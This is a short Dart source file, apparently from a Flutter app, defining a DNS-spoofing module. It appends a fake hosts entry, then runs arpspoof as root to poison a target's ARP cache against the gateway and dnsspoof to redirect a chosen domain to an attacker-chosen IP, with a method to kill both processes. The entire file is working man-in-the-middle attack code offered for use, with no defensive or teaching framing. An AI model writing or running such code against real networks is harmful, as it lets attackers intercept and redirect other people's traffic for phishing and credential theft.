import 'dart:io';
import 'package:wimax_flutter/core/shell_executor.dart';

class DnsSpoofModule {
  final ShellExecutor _shell = ShellExecutor();

  Future<void> startDnsSpoof({required String targetIp, required String spoofedDomain, required String fakeIp}) async {
    final hostsEntry = "$fakeIp $spoofedDomain\n";
    final hostsFile = File("/data/local/tmp/hosts")..writeAsString(hostsEntry, mode: FileMode.append);

    await _shell.executeRootCommand("arpspoof -i wlan0 -t $targetIp 192.168.1.1 &");
    await _shell.executeRootCommand("dnsspoof -i wlan0 -f ${hostsFile.path}");
  }

  Future<void> stopDnsSpoof() async {
    await _shell.executeRootCommand("pkill dnsspoof");
    await _shell.executeRootCommand("pkill arpspoof");
  }
}